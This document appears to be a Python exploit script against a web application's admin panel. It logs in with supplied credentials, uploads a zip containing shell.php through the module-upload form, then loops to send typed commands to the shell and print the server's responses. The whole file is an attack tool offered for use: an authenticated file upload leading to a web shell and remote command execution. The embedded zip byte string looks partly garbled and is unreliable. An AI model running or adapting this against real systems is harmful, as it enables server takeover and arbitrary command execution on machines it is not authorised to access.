import mechanize
import sys
import requests
from colorama import Fore, Style
import http 
from http import cookiejar

if (len(sys.argv) != 2):
    print(Fore.LIGHTYELLOW_EX + """
        _..od88888bo.._
      .d""'         '""b.
    .d"'               '"b.
   d"'                   '"b
  d'                       'b
 88       DⒶ RK_LⒶYER       88
(88       DⒶ RK_LⒶYER       88)
 88       DⒶ RK_LⒶYER       88
  YI                       IP
   YI                     IP
    "9.                 .P"
      "8               8"
        `""Y8888888P""`
    
    """ + Style.RESET_ALL)

    print(Fore.RED + "[*] Usage: exploit.py <RHOST> \n" + Style.RESET_ALL)
    exit(0)

rhost = sys.argv[1]

print(Fore.LIGHTCYAN_EX + """
        _..od88888bo.._
      .d""'         '""b.
    .d"'               '"b.
   d"'                   '"b
  d'                       'b
 88       DⒶ RK_LⒶYER       88
(88       DⒶ RK_LⒶYER       88)
 88       DⒶ RK_LⒶYER       88
  YI                       IP
   YI                     IP
    "9.                 .P"
      "8               8"
        `""Y8888888P""`
    
    """ + Style.RESET_ALL)

username = str(input(Fore.LIGHTWHITE_EX + "Username: " + Style.RESET_ALL))
password = str(input(Fore.LIGHTWHITE_EX + "Password: " + Style.RESET_ALL))

print("")

print(Fore.LIGHTGREEN_EX + "[!] Logining..." + Style.RESET_ALL)

mb = mechanize.Browser() # Browser nesnesi +
mb.set_handle_robots(False) # robots.txt dosyalarını göz ardı ettim.

cj = http.cookiejar.CookieJar()
mb.set_cookiejar(cj) 

mb.open("http://"+rhost+"/admin/")
assert mb.viewing_html()
mb.select_form(nr=0)
mb.form['username'] = username
mb.form['password'] = password
mb.submit()

title = mb.title()
print(Fore.LIGHTYELLOW_EX + " + [*] You are currently in the "+ title +" section of the app" + Style.RESET_ALL)

rce_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------13859713751632544601258659337"}

rce_data = r"""-----------------------------13859713751632544601258659337 Content-Disposition: form-data; name="action"

add -----------------------------13859713751632544601258659337 Content-Disposition: form-data; name="mandator"

0 -----------------------------13859713751632544601258659337 Content-Disposition: form-data; name="module_file"; filename="test.zip" Content-Type: application/zip

PK\x03\x04\x14\x00\x08\x00\x08\x00\x06\x89\x85M\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00 \x00package.jsonUT\r\x00\x07\xcc\xdb\x07\\\cc\xdb\x07\\cc\xdb\x07\\ux\x0b\x00\x01\x04\x00\x00\x00\x00\x04\x00\x00\x00\x00\x03\x00PK\x07\x08\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00PK\x03\x04\x14\x00\x08\x00\x08\x00G\x87{M\x00\x00\x00\x00\x00\x00\x00\x00\xdc\x01\x00\x00\t\x00 \x00shell.phpUT\r\x00\x07wM\xfd[7\x81\x07\wM\xfd[ux\x0b\x00\x01\x04\x00\x00\x00\x00\x04\x00\x00\x00\x00\x95\x91\xcbj\c30\x10E\xf7\xfa\x8a\xc1\x18,\xd3\xe6\x0b\xd2G6I)d\x15\xb2+e\x10\xf2\xb8\x16\x1#x\xe4<\x08\xf9\xf7:\x8d\xe3\xb8M\xbb\xe8JH\xf7\xce\xbdg\xd0\xc3\xf3\xbaZ\x8b4V\x86\xb4\e\x11\g\xaf\xf3)\e2XLx\xcf\x91\x9cLt\e5B\x01\xcdG\x18m\e1\xeaM\xf2o\x16\15c\rd\w\e6\x87!\d5\c19\e5\x8b68\c5\x97\e9\xf2-\d1\xaeH\de\c7B\x98\12\a4\xb6\x8a\19ig8\xb2\xcc\eTZ\d2\d1\04?k\xfc\d7\99\e59\1c\84\00\80\b4\ec\9e\da
O[\b8\f5\ca\ec\cc\92\b5\ad\c3\81\d1\x93\f1\9b\b0"yAiuq\04\b2L'\84\8b\ad\a7\d0\caZl\98j<I\af\eaZ\ed\af\1c\bf\a9}\f3=\9c\ef}\d3\bf\aa\fe*\19\c4\df\ae\d0Mt\df\30\d0\8f\e2\13PK\07\08\c6=\06k\de\00\00\00\dc\01\00\00PK\01\02\x14\03\x14\00\x08\00\x08\00\x06\x89\85M\00\00\00\00\02\00\00\00\00\00\00\00\x0c\00 \x00\00\00\00\00\00\00\00\00\a4\81\00\00\00\00package.jsonUT\r\00\07\cc\db\07\\\cc\db\07\\cc\db\07\\ux\x0b\00\01\04\00\00\00\00\04\00\00\00\00PK\01\02\x14\03\x14\00\x08\00\x08\00G\87{M\c6\=\06k\de\00\00\00\dc\01\00\00\t\00 \x00\00\00\00\00\00\00\00\00\a4\81\\00\00\00shell.phpUT\r\00\07wM\fd[7\81\07\wM\fd[ux\x0b\00\x01\x04\00\00\00\00\04\00\00\00\00PK\x05\06\00\00\00\00\02\00\02\00\xb1\00\00\00\x91\01\00\00\00\00\r
-----------------------------13859713751632544601258659337--\r 
"""

upload = requests.post("http://"+rhost+"/admin/?req=modules&action=add", headers=rce_headers, cookies=cj, data=rce_data)

if upload.status_code == 200:
    print(Fore.GREEN + "[*] Shell successfully uploaded!" + Style.RESET_ALL)

while True:
      shell = requests.get("http://"+rhost+"/shell.php")
      
      if shell.status_code == 200:
        command = str(input(Fore.WHITE + "shell> "))
        url = requests.get("http://"+rhost+"/shell.php?cmd="+command+"")
        print(url.text)

      else:
         print (Fore.RED + "+ [X] Unable to upload or access the shell" + Style.RESET_ALL) 
         sys.exit()

